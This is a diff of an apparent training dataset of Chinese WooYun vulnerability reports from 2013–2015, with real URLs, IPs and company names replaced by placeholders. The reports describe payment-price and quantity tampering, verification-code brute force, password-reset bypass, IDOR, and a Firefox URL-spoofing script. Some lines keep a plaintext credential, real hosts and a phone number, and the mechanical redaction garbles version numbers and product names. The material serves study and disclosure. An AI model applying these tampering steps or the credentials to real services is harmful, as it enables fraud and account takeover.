 
@@ -12403,13 +12403,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://weibo.com/comment/A9BrmkUjG从微博看你们说的 各种安全 然后就想试试http://wooyun.org/bugs/wooyun-2010-023055之前我也报过 上次修复了 这次是处新的android中data/data/com.eg.android.AlipayGphone/databases/下alipayclient.db里userinfo表中一项 ‘gesturepwd’ cmd5简单加密手势解锁密码
+**详情**: https://example.com/[已脱敏] 各种安全 然后就想试试https://example.com/[已脱敏] 上次修复了 这次是处新的android中data/data/com.eg.android.AlipayGphone/databases/下alipayclient.db里userinfo表中一项 ‘gesturepwd’ cmd5简单加密手势解锁密码
 
 **POC**: alipayclient.db里userinfo表中一项 ‘gesturepwd’ cmd5简单加密手势解锁密码db数据其中的userinfo解密之然后手机画了个图 猜一下 手势解锁的排列方式。。。。为了确定这个地方确实是手势解锁密码 而不是偶然 就又改了一个密码然后又来看看果然变了 解密之额。。和之前的设想对不上了！！！不对，这其中一定有问题 拿出纸笔 画了一个图然后排列方式就跃然纸上了~~~就是这样~
 
 **绕过**: 直接利用
 
-**修复**: http://wooyun.org/bugs/wooyun-2010-023055这里面：厂商回应：危害等级：低漏洞Rank：5确认时间：2013-05-13 14:10厂商回复：非常感谢您对我们的支持和关注，该问题已确认，将于新版客户端中修复。不知道你们怎么修复的 外加你们微博说：“假设这个家伙的
+**修复**: https://example.com/[已脱敏] 14:10厂商回复：非常感谢您对我们的支持和关注，该问题已确认，将于新版客户端中修复。不知道你们怎么修复的 外加你们某社交平台说：“假设这个家伙的
 ---
 
 ---
@@ -12435,8 +12435,8 @@
 ---
 
 ---
-### [wooyun-2015-095886] 京东某站充值逻辑漏洞
-**厂商**: 京东商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-095886] 某电商平台某站充值逻辑漏洞
+**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -12447,7 +12447,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://i.jcloud.com/account登陆进去，点击充值金额100，然后下一步来到这里继续选银行，选支付方式，继续点击充值！！！，来到这里点击立即支付，然后修改100数据包为0.1，需要修改三个值。你懂的businessRequestBean.id=2775066&businessRequestBean.amount=100&businessRequestBean.orderType=998&businessRequestBean.orderCode=6&businessRequestBean.hmac=840F275E3BADC9277752A7B5A85DBC8754434CA26D208D31&businessRequestBean.payType=4&businessRequestBean.acceptType=old&businessRequestBean.vir
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 好害怕，赶紧来提交
 
@@ -12471,7 +12471,7 @@
 
 **详情**: 故事开始，工欲善其事，必先利其用户名。首先在uc.sunits.com等收集了部分用户名。ucsupportitservicewangxinwuyfhouyjhaoxxmapingchenlinlinmengalinmenglixiajiaoxbwubincwubinzhangkunfuqiongshijfbaiyubbuffcaofzcaoshcengbychengzchenjjechenzpchumydingshuoduhangduxjgaojygaomlgaopengcgaoweibguanlrguokmhejlaheyaohoudbahuangjiebhuangsjhucyhucyahucybhuohyjiaxwjulskangcqkongmzaliangkaiclifyalinbxliucongliujjfliuqicliuxjcliuxyhliuyfgliuysdliuzhen
 
-**POC**: http://rms.sunits.com/rms_R/login!login.do存在命令执行漏洞注册用户的上传存在问题。利用CAS，登陆hrm系统右上角有个个人信息，点击会获取当前用户的信息，但是点击的时候会有一个请求将ITCODE换成别人的ITCODE 就能得到别人的详细信息，包括身份证号码等等。（HRM是你们比较重要的系统了）比如获取wufy并且考勤管理查询存在SQL注入http://202.85.212.104/SDMS/helpdesk系统，存在弱口令工单查询存在注入GET /SDMS/incident!findIncidentByProperty.do?inicdentStatu
+**POC**: https://example.com/[已脱敏] 就能得到别人的详细信息，包括身份证号码等等。（HRM是你们比较重要的系统了）比如获取wufy并且考勤管理查询存在SQL注入http://[IP已脱敏] /SDMS/incident!findIncidentByProperty.do?inicdentStatu
 
 **绕过**: 直接利用
 
@@ -12491,7 +12491,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天下载了几个pdf,用福昕pdf阅读器打开就崩溃了。查看pdf属性发现pdf的修改时间为 3219‎年‎1‎月‎6‎日 ‎星期日，‏‎1:57:00这样，福昕阅读器就崩溃了.提供两个pdf:http://pan.baidu.com/share/link?shareid=3106765115&uk=1463633463
+**详情**: 今天下载了几个pdf,用福昕pdf阅读器打开就崩溃了。查看pdf属性发现pdf的修改时间为 3219‎年‎1‎月‎6‎日 ‎星期日，‏‎1:57:00这样，福昕阅读器就崩溃了.提供两个pdf:https://example.com/[已脱敏]
 
 **POC**: pdf属性修改时间超过window的时间设置范围打开crash了
 
@@ -12545,8 +12545,8 @@
 ---
 
 ---
-### [wooyun-2015-0103886] 淘宝网某处可绑定任意手机号（业务逻辑设计不当）
-**厂商**: 淘宝网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0103886] 某电商平台网某处可绑定任意手机号（业务逻辑设计不当）
+**厂商**: 某电商平台网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -12557,7 +12557,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出现在淘宝二手http://sell.2.taobao.com/本来我是想卖一个二手机械键盘的，在发布商品的时候发现要验证手机，那就验证呗，结果收到的验证码令我无比蛋疼，果然是业务线拉的越长，短板越多吗？验证手机号是在这里验证的，手机收到的验证码是四位数的。当然，为了验证该漏洞的真实性，我用了小伙伴的手机号来进行绑定。可以看到小伙伴已经拿到验证码了，也是四位数的，证明这个验证码机制确实是四位数，而不是随机。而且居然还是一样的。。。。下面让我们来爆破测试。
+**详情**: 问题出现在某电商平台二手https://example.com/[已脱敏]
 
 **POC**: 首先打开bp抓包，其余过程省略。可以看到这个验证码的回复包是true并且成功。绑定成功！
 
@@ -12567,8 +12567,8 @@
 ---
 
 ---
-### [wooyun-2014-074376] QQ充值逻辑缺陷可被非法利用提现
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2014-074376] 某互联网公司充值逻辑缺陷可被非法利用提现
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -12581,7 +12581,7 @@
 
 **详情**: 图片直播 进入活动页面 选择充值金额 选择信用卡支付 付款后手机收到信用卡消费信息，但是话费没有充入，而是财付通直接退款，这财付通退款金额就不用多说了吧 可以直接提现。。。这应该就是传说中的信用卡套现吧退款时间大约 1秒 -5分钟左右
 
-**POC**: 利用页面 http://static.chong.qq.com/promote/chong/2014/index_34.shtml#area19
+**POC**: 利用页面 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12667,7 +12667,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 先来注册邮箱页面然后这里抓包改月数都是15一个月哦，我来改5个月看看哈哈总价是不是不变再来试试负值，负值月数应该是永久了吧哈哈ps:最后我没支付 要支付宝支付  好贵 15块呢ps:因为测试 每个邮箱只能提交一次 ，订单一次，所以abc999_xx  cc bb之类的换动了 不过不影响效果
+**详情**: 先来注册邮箱页面然后这里抓包改月数都是15一个月哦，我来改5个月看看哈哈总价是不是不变再来试试负值，负值月数应该是永久了吧哈哈ps:最后我没支付 要某电商平台支付  好贵 15块呢ps:因为测试 每个邮箱只能提交一次 ，订单一次，所以abc999_xx  cc bb之类的换动了 不过不影响效果
 
 **POC**: 哈哈
 
@@ -12689,7 +12689,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先我们登陆xiaoliu2的号，增加一个收货人的地址：可以看到，这是小李。我们点击编辑，可以看到id号，记住此ID号，等下要用到：http://www.m6go.com/my/address.do?addressid=380915OK，我们换一个号xiaoliu1进行登陆：我们点击编辑，然后点击保存的时候抓取数据包：可以看到，这里的地址id为380912。。我们将其改为xiaoliu2的地址id:380915：然后提交数据。提交后我们登陆xiaoliu2看看。。可以看到xiaoliu2的地址已被删除。。我们此时回头来看看xiaoliu1的地址：可以看到，xiaoliu1的号此时多了一个地址。。 说明已经把xiaoliu2的id占用过来自己用了，所以xiaoliu2的收货地址就不存在了。这样就可以达到批量覆盖所有人的收货地址。。。也是是批量删除所有人的收货地址。。。利遍就行了，直接拿bur
+**详情**: 首先我们登陆xiaoliu2的号，增加一个收货人的地址：可以看到，这是小李。我们点击编辑，可以看到id号，记住此ID号，等下要用到：https://example.com/[已脱敏] 说明已经把xiaoliu2的id占用过来自己用了，所以xiaoliu2的收货地址就不存在了。这样就可以达到批量覆盖所有人的收货地址。。。也是是批量删除所有人的收货地址。。。利遍就行了，直接拿bur
 
 **POC**: 如上
 
@@ -12755,9 +12755,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://58.60.230.90/test zxcvbn 可登录系统
+**详情**: http://[IP已脱敏] zxcvbn 可登录系统
 
-**POC**: http://58.60.230.90/test zxcvbn 可登录系统
+**POC**: http://[IP已脱敏] zxcvbn 可登录系统
 
 **绕过**: 直接利用
 
@@ -12787,8 +12787,8 @@
 ---
 
 ---
-### [wooyun-2015-0108090] 中国联通某IDC机房信息安全管理系统设计缺陷致使系统沦陷
-**厂商**: 中国联通 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0108090] 某运营商某IDC机房信息安全管理系统设计缺陷致使系统沦陷
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -12799,7 +12799,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://14.204.84.94:8080/ucenter/index.jsp中国联通昆明分公司企业侧互联网综合管理平台找回密码存在逻辑漏洞 可以直接重置密码step改为4可直接绕过密保问题修改密码后台功能太强大了
+**详情**: http://[IP已脱敏] 可以直接重置密码step改为4可直接绕过密保问题修改密码后台功能太强大了
 
 **POC**: 后台功能太强大了
 
@@ -12843,7 +12843,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://store.hicling.com/购买商品加入购物车后，可抓包修改商品数量，只需要修改数量，总价什么的会自动在服务器计算。我购买了一个1198的手环＋一个79的充电座＋（－10）个128的腕带，还有22的运费，共计1198+79+(-10)*28+22=19元，成功提交订单并付款。购物车确认时提交POST的内容如下：POST /order/confirm HTTP/1.1Host: store.hicling.comAccept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cnAccept-Encoding: gzip, deflateOrigin: http://store.hicling.comConnection: keep-aliveUser-
+**详情**: https://example.com/[已脱敏])*28+22=19元，成功提交订单并付款。购物车确认时提交POST的内容如下：POST /order/confirm HTTP/1.1Host: store.hicling.comAccept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cnAccept-Encoding: gzip, deflateOrigin: https://example.com/[已脱敏] keep-aliveUser-
 
 **POC**: 修改并发包后，返回的确认内容如下：成功付款截图：
 
@@ -12865,7 +12865,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 嘛http://www.ahongmall.com/选个最贵的然后填了个信息在这里 点开我们伟大的F12改成0.1然后付款走起
+**详情**: 嘛https://example.com/[已脱敏] 点开我们伟大的F12改成0.1然后付款走起
 
 **POC**: 请等待发货！
 
@@ -12887,7 +12887,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接这样就可以创建订单！主要字段 totalPricehttp://jiudian.trip8080.com/orderSubmit.jspx?callback=jsonp1410511463418&hid=7284&rid=73079&pid=50042&cid=33&rm=1&tm1=2014-09-14&tm2=2014-09-16&guest=%2525E5%2525BC%2525A0%2525E8%25258C%2525AB%2525E8%25258C%2525AB&mobile=13047661205&roomPrice=270&userEmail=&latetime=06%3A00&keepTime=23%3A59-06%3A00&totalPrice=0
+**详情**: 直接这样就可以创建订单！主要字段 totalPricehttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12931,7 +12931,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在关注微信后，微信自动发送一条消息：点击该链接可进入注册页面（该页面可电脑访问）输入手机号后，提示成功当再次点击发送的时候这时按F12调出网页控制台可以得到该参数为：phoneNumber=手机号看看js文件:这样就构造出一个地址https://**.**.**.**/wap/member/phoneCheckCodeSend.action?phoneNumber=手机号码当页面访问的时候可以直接提交上去，并没有加入手机号验证。
+**详情**: 在关注某互联网公司后，某互联网公司自动发送一条消息：点击该链接可进入注册页面（该页面可电脑访问）输入手机号后，提示成功当再次点击发送的时候这时按F12调出网页控制台可以得到该参数为：phoneNumber=手机号看看js文件:这样就构造出一个地址https://**.**.**.**/wap/member/phoneCheckCodeSend.action?phoneNumber=手机号码当页面访问的时候可以直接提交上去，并没有加入手机号验证。
 
 **POC**: 这样应该能够证明了吧。。。
 
@@ -12975,7 +12975,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.e8088.com/user/product/chost/chostBuyAction!chostInfo.action?productId=ch2014062500009&idcId=30
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12997,7 +12997,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mall.ecitic.com(中信商城)存在逻辑漏洞首先注册一个账号然后在登入的地方点击忘记密码找回在提交验证码的时候 没做限制 ge请求 很容易爆破现在我们用burp进行跑验证码爆破成功：获取到正确的验证码后
+**详情**: https://example.com/[已脱敏])存在逻辑漏洞首先注册一个账号然后在登入的地方点击忘记密码找回在提交验证码的时候 没做限制 ge请求 很容易爆破现在我们用burp进行跑验证码爆破成功：获取到正确的验证码后
 
 **POC**: 综上
 
@@ -13019,7 +13019,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 263网络视频会议业务开通或变更：http://ma.263em.com/gainvideo!saveOrUpdate.action参数可为负数，开通成功：如果不取消，每个月都可以领工资：
+**详情**: 263网络视频会议业务开通或变更：https://example.com/[已脱敏]
 
 **POC**: 非常抱歉，又多了两百，麻烦管理员把数据改回去吧，我当前余额应该￥2.1我的账号你们知道的。
 
@@ -13029,8 +13029,8 @@
 ---
 
 ---
-### [wooyun-2013-040087] 百度卫士存在设计缺陷导致存在风险
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-040087] 某搜索引擎卫士存在设计缺陷导致存在风险
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -13041,7 +13041,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度卫士存在设计缺陷。1.百度卫士的用户配置文件夹在系统盘的C:\Documents and Settings\All Users\Application Data\baidu\BaiduAn下面，这个文件夹里面没有自我保护，所有程序都有写入权限，这边就很容易出问题。我们看到上面图里面用户优化过的计划任务项目被备份在了上面的文件夹里面。C:\Documents and Settings\All Users\Application Data\baidu\BaiduAn\FTSOManager\BDMDisabled\Tasks这个文件夹是任何权限都可以写入。那么这边就出现缺陷了。2.我们随便做个测试吧。自己写个test.job写到这个文件夹下面去。看看在百度卫士相关位置能不能显示。如果能显示的话应该就有缺陷，有可趁之机。你看，在计划任务处被显示了。而且状态是“禁用”，并且可以被启用。3.如何
+**详情**: 某搜索引擎卫士存在设计缺陷。1.某搜索引擎卫士的用户配置文件夹在系统盘的C:\Documents and Settings\All Users\Application Data\baidu\BaiduAn下面，这个文件夹里面没有自我保护，所有程序都有写入权限，这边就很容易出问题。我们看到上面图里面用户优化过的计划任务项目被备份在了上面的文件夹里面。C:\Documents and Settings\All Users\Application Data\baidu\BaiduAn\FTSOManager\BDMDisabled\Tasks这个文件夹是任何权限都可以写入。那么这边就出现缺陷了。2.我们随便做个测试吧。自己写个test.job写到这个文件夹下面去。看看在某搜索引擎卫士相关位置能不能显示。如果能显示的话应该就有缺陷，有可趁之机。你看，在计划任务处被显示了。而且状态是“禁用”，并且可以被启用。3.如何
 
 **POC**: (见原文)
 
@@ -13085,7 +13085,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一、首先选择一件商品，这里为了测试，选择商城中最便宜的一件商品作为测试商品49元，“立即购买”后，通过fiddler拦截请求。二、对价格进行修改将“49”改成“1”三、生成的订单中已经由49元变成1元了四、生成订单后，进入支付阶段，通过拦截请求可知，此后的该订单的总价已全部变成1元了五、付款选择支付宝，可以正常支付
+**详情**: 一、首先选择一件商品，这里为了测试，选择商城中最便宜的一件商品作为测试商品49元，“立即购买”后，通过fiddler拦截请求。二、对价格进行修改将“49”改成“1”三、生成的订单中已经由49元变成1元了四、生成订单后，进入支付阶段，通过拦截请求可知，此后的该订单的总价已全部变成1元了五、付款选择某电商平台，可以正常支付
 
 **POC**: 这里用1元支付完成最后支付流程，订单最后完成
 
@@ -13107,9 +13107,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: App 调用的很多 api 设计有缺陷, 在很多 api 中看到用户的详细信息比如获得用户的详细信息http://211.151.134.220:9010/V3/User/getUserSimpleInfo比如获得附近的拼单http://211.151.134.220:9010/V3/BookingDriver/getNearbyBookingRideList举例的这两个 api 构成一个完整的穷举链条通过手动设置任何经纬度的拼单列表 /BookingDriver/getNearbyBookingRideList, 我们可以获得 任意地点的 user 的 id (user_cid) , 通过 /User/getUserSimpleInfo  可以查看详细的用户信息.POST 的 parameter 中 vkey 的逻辑可以很简单的逆向获得.比如 ts 获得时间戳 2015031200544
+**详情**: App 调用的很多 api 设计有缺陷, 在很多 api 中看到用户的详细信息比如获得用户的详细信息http://[IP已脱敏] api 构成一个完整的穷举链条通过手动设置任何经纬度的拼单列表 /BookingDriver/getNearbyBookingRideList, 我们可以获得 任意地点的 user 的 id (user_cid) , 通过 /User/getUserSimpleInfo  可以查看详细的用户信息.POST 的 parameter 中 vkey 的逻辑可以很简单的逆向获得.比如 ts 获得时间戳 2015031200544
 
-**POC**: 比如上一弹中的 469c6750-4ba2-49ce-8baa-43e8640229ac行驶证什么不直接证明了简单的 EXP (需要你自己提供登录后的 token 和 user_cid)http://pastie.org/10019970
+**POC**: 比如上一弹中的 469c6750-4ba2-49ce-8baa-43e8640229ac行驶证什么不直接证明了简单的 EXP (需要你自己提供登录后的 token 和 user_cid)https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13217,9 +13217,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.html HTTP/1.1Host: touch.17u.cnProxy-Connection: keep-aliveReferer: http://touch.17u.cn/membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.htmlContent-Length: 81Cache-Control: max-age=0Origin: http://touch.17u.cnContent-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;
+**详情**: POST /membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.html HTTP/1.1Host: touch.17u.cnProxy-Connection: keep-aliveReferer: https://example.com/[已脱敏] 81Cache-Control: max-age=0Origin: https://example.com/[已脱敏] application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;
 
-**POC**: POST /membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.html HTTP/1.1Host: touch.17u.cnProxy-Connection: keep-aliveReferer: http://touch.17u.cn/membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.htmlContent-Length: 81Cache-Control: max-age=0Origin: http://touch.17u.cnCon
+**POC**: POST /membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.html HTTP/1.1Host: touch.17u.cnProxy-Connection: keep-aliveReferer: https://example.com/[已脱敏] 81Cache-Control: max-age=0Origin: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13261,7 +13261,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xinbaigo.com/index.html先去商城卖东西吧前面支付都做得不错但是到了结算的时候就出错了
+**详情**: https://example.com/[已脱敏]
 
 **POC**: - - 审核大大 就不要让我付款证明了吧。。。我家穷 而且你仔细看看订单都显示是20块。。。付款的时候也显示20快求礼物。。。。礼物啊~
 
@@ -13272,7 +13272,7 @@
 
 ---
 ### [wooyun-2015-0108047] 分分钟搞定邮箱大师手势密码
-**厂商**: 网易 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -13305,13 +13305,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞URL：http://www.daxincpa.com/psa/login.action?falg=psa&userid=001374&userpwd=Ug0rfX9uyZ8=
+**详情**: 漏洞URL：https://example.com/[已脱敏]
 
 **POC**: 涉及敏感信息太多，不可多截图- -审核人员一看就懂的
 
 **绕过**: 直接利用
 
-**修复**: 百度一下
+**修复**: 某搜索引擎一下
 ---
 
 ---
@@ -13327,7 +13327,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 回来的时候发现之前的订单显示交易完成了,吓我一跳我没有收到货啊！感觉应该是人工审核订单  看到负号所以没有发货。我竟然花了31块钱去测试,能报销吗？ 不能报销送个礼物安慰一下可好？订单号:D20150227194335297问题网站http://estore.wacom.com.cn随便选几个加入购物车，去结算看看能不能复现上一个漏洞了,发现直接加-不行了于是果断祭出神器 burp  添加数量 抓包  改数量  没错 就是那么简单！改完后刷新一下就好了！经测试  搭配出了一个组合 最后剩下一块钱 可是最后邮费要30无线无源鼠标	                        x 1商品编号：KC-100-00DB无线套件                                 x 1商品编号：ACK-40401学习板One By Wacom CTL-671/K0-F	       
+**详情**: 回来的时候发现之前的订单显示交易完成了,吓我一跳我没有收到货啊！感觉应该是人工审核订单  看到负号所以没有发货。我竟然花了31块钱去测试,能报销吗？ 不能报销送个礼物安慰一下可好？订单号:D20150227194335297问题网站https://example.com/[已脱敏] burp  添加数量 抓包  改数量  没错 就是那么简单！改完后刷新一下就好了！经测试  搭配出了一个组合 最后剩下一块钱 可是最后邮费要30无线无源鼠标	                        x 1商品编号：KC-100-00DB无线套件                                 x 1商品编号：ACK-40401学习板One By Wacom CTL-671/K0-F	       
 
 **POC**: (见原文)
 
@@ -13349,9 +13349,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注：可增 删 改 查涉及 二百八十五万 商家http://bomeibian.koudai.com/j_spring_security_check登陆处没有验证码，可撞库抓取登录请求，设置top500 username及密码请脑补此过程wangxin：koudai2013
+**详情**: 注：可增 删 改 查涉及 二百八十五万 商家https://example.com/[已脱敏] username及密码请脑补此过程wangxin：koudai2013
 
-**POC**: 查看商家列表已入住商家http://item.koudai.com/showShopDetails.do?appName=IShopping_Crown_66bc5f54f02862e2608c55a97e3bafe9&type=menu-shop优惠券商品管理商家审核，，，，，，就这样吧  给高rank吧  不要小瞧一个小小的安全问题
+**POC**: 查看商家列表已入住商家https://example.com/[已脱敏]  给高rank吧  不要小瞧一个小小的安全问题
 
 **绕过**: 直接利用
 
@@ -13371,13 +13371,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 华宇拼音输入法 6.9.0.22使用CreateProcess()函数创建新的进程及其主线程，对于CreateProcess函数，Window规定如果传入的启动程序名称和参 数中包含空格，那么这些名称和参数在传入给CreateProcess函数之前必须用双引号””进行包含，比如c:/program files/sub dir/program name，如果不用””包含，则Window可能会产生歧异。华宇拼音输入法的设置功能upimcfg6.exe存在可信任路径代码执行漏洞
+**详情**: 华宇拼音输入法 [IP已脱敏]使用CreateProcess()函数创建新的进程及其主线程，对于CreateProcess函数，Window规定如果传入的启动程序名称和参 数中包含空格，那么这些名称和参数在传入给CreateProcess函数之前必须用双引号””进行包含，比如c:/program files/sub dir/program name，如果不用””包含，则Window可能会产生歧异。华宇拼音输入法的设置功能upimcfg6.exe存在可信任路径代码执行漏洞
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考WooYun: 百度输入法调用CreateProcess函数漏洞
+**修复**: 参考WooYun: 某搜索引擎输入法调用CreateProcess函数漏洞
 ---
 
 ---
@@ -13393,7 +13393,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 你们打电话说要送礼品，于是就测了下，发现个支付漏洞和这个本来打算给你们邮件的，结果支付漏洞修了，我哭了。别这个也修了 还是提乌云吧http://www.zhuqu.com/activity/airclean/item-desc点击立刻购买
+**详情**: 你们打电话说要送礼品，于是就测了下，发现个支付漏洞和这个本来打算给你们邮件的，结果支付漏洞修了，我哭了。别这个也修了 还是提乌云吧https://example.com/[已脱敏]
 
 **POC**: 提交订单时候抓包delivery_id是可以改的改个8试试就能看到了
 
@@ -13425,8 +13425,8 @@
 ---
 
 ---
-### [wooyun-2013-025160] 通过手机游侠(八门神器)修改腾讯旗下一火爆网游数据，刷钱
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-025160] 通过手机游侠(八门神器)修改某互联网公司旗下一火爆网游数据，刷钱
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -13461,7 +13461,7 @@
 
 **详情**: 由于firefox在实现data uri协议的时候不指定mediatype也是一个合法的data url,导致我们可以在parameters处做url欺骗.
 
-**POC**: <script>function poc(){var w=open('data:;//view.news.qq.com/zt2012/modern_times/index.htm#1,2');setTimeout(function(){w.document.body.innerHTML='sogili hehehe';},100)}</script><button onclick=poc();>clickme</button>
+**POC**: <script>function poc(){var w=open('data:;//view.news.某互联网公司.com/zt2012/modern_times/index.htm#1,2');setTimeout(function(){w.document.body.innerHTML='sogili hehehe';},100)}</script><button onclick=poc();>clickme</button>
 
 **绕过**: 直接利用
 
@@ -13513,7 +13513,7 @@
 ---
 
 ---
-### [wooyun-2013-023746] Espcms V5.6.13.04.22 UTF8 正式版另类过后台所有模块验证漏洞之5/N
+### [wooyun-2013-023746] Espcms V5.[IP已脱敏] UTF8 正式版另类过后台所有模块验证漏洞之5/N
 **厂商**: 易思ESPCMS企业网站管理系统 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 后台管理
@@ -13547,7 +13547,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 云片短信验证码平台，短信充值数量可被修改为大于1的任何数字。通过工具抓包可以得到在充值短信时POST了指定数据到以下页面，http://www.yunpian.com/alipay/create，POST数据中的smsNum参数为短信充值数量，可被随意修改，修改过后返回的HTML保存在本地html文件中，打开即可跳转到支付宝支付页面。
+**详情**: 云片短信验证码平台，短信充值数量可被修改为大于1的任何数字。通过工具抓包可以得到在充值短信时POST了指定数据到以下页面，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13569,7 +13569,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /api/pay/pay.php HTTP/1.1Host: www.wefinder.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.wefinder.com/upgrade.phpCookie: CNZZDATA30052730=cnzz_eid%3D1685122873-1426734709-%26ntime%
+**详情**: POST /api/pay/pay.php HTTP/1.1Host: www.wefinder.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏] CNZZDATA30052730=cnzz_eid%3D1685122873-1426734709-%26ntime%
 
 **POC**: (见原文)
 
@@ -13591,7 +13591,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在问题的站点:http://ba.hichina.com/login.aspx  万网ICP代备案管理系统。自己新买一个域名要做备案,可惜申请时密码忘记了,故找回密码,收到找回邮件链接如下:按照提示修改自己密码成功。。职业病原因,顺手将url中邮箱地址替换成admin@hichina.com修改,悲剧,修改成功。。。如图:也就是说,只要知道确实存在的账户,即可直接修改该帐号密码。
+**详情**: 存在问题的站点:https://example.com/[已脱敏]  万网ICP代备案管理系统。自己新买一个域名要做备案,可惜申请时密码忘记了,故找回密码,收到找回邮件链接如下:按照提示修改自己密码成功。。职业病原因,顺手将url中邮箱地址替换成admin@hichina.com修改,悲剧,修改成功。。。如图:也就是说,只要知道确实存在的账户,即可直接修改该帐号密码。
 
 **POC**: 如图:
 
@@ -13613,7 +13613,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 115浏览器最新版：正常而言，访问url链接的方式无外乎两种：window.open()location.href='xxx';但是因为chrome的严格限制，上面的2种api都是没办法访问chrome://协议的资源以及file://的资源的：通过上述2个api访问，弹出的只是about:blank，这种人畜无害的链接。（无法访问对应的资源的）通过对115浏览器自带api的研究，我发现有一个对象不需要特权域，你是用115浏览器的用户，就能调用该对象：browserInterface该对象又有一个方法：browserInterface.openSpecificURL();伪代码：browserInterface.openSpecificURL(url)此处我们仅仅需要传入一个url，通过该api，即可跨越浏览器边界，实现访问本地资源！构造好的poc：http://wutongyu.info
